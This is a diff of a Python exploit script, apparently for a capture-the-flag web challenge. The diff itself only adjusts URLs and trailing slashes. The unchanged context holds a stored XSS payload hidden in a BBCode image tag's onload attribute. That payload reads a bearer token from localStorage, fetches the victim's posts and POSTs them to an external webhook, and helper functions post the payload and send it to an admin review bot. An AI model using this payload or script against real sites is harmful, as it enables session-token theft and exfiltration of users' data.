@@ -10,25 +10,25 @@ WEBHOOK_LOGS = "https://manini.alwaysdata.net/logs.txt"
 XSS_PAYLOAD = "[img width=\"100 onload=fetch('/api/posts',{method:'GET',headers:{'Authorization':'Bearer'+String.fromCharCode(32)+localStorage.getItem('DiarrheaTokenBearerInLocalStorageForSecureRequestsContactAdminHeKnowsHotToUseWeHaveManyTokensHereSoThisOneShouldBeUnique')}}).then(r=>r.json()).then(data=>fetch('WEBHOOK',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'posts='+encodeURIComponent(JSON.stringify(data.items))}))\"]https://whitedukesdz.ninja/logo.png[/img]".replace("WEBHOOK", WEBHOOK)
 
 session = requests.Session()
-base_url = "https://bubble-tea.task.sasc.tf/"
-bot_url = "https://cba28290-655f-4d8e-81e4-10933fe822a9.kit.sasc.tf/"
+base_url = "https://bubble-tea.task.sasc.tf"
+bot_url = "https://805cf29f-caff-4314-a75d-299c5d76ae12.kit.sasc.tf"
 
 username = "user_" + str(random.randint(1000, 9999))
 password = "pass_" + str(random.randint(1000, 9999))
 
 def create_account():
-    resp = session.post(f"{base_url}/api/auth/register", json={"username": username, "password": password})
+    resp = session.post(f"{base_url}/api/auth/register/", json={"username": username, "password": password})
     print("Account created successfully.")
     return resp.json().get("access_token")
 
 def create_post(access_token):
-    resp = session.post(f"{base_url}/api/posts", json={"content": XSS_PAYLOAD}, headers={"Authorization": f"Bearer {access_token}"})
+    resp = session.post(f"{base_url}/api/posts/", json={"content": XSS_PAYLOAD}, headers={"Authorization": f"Bearer {access_token}"})
     print("Post created successfully.")
     post = resp.json().get("post")
     return {"user_id": post.get("user_id"), "post_id": post.get("id")}
 
 def submit_to_bot(user_id, post_id):
-    resp = session.post(f"{bot_url}/review", json={"url": f"{base_url}post/{user_id}/posts/{post_id}"})
+    resp = session.post(f"{bot_url}/review", json={"url": f"{base_url}/post/{user_id}/posts/{post_id}"})
     print("Submitted to bot successfully.")
 
 def get_flag():
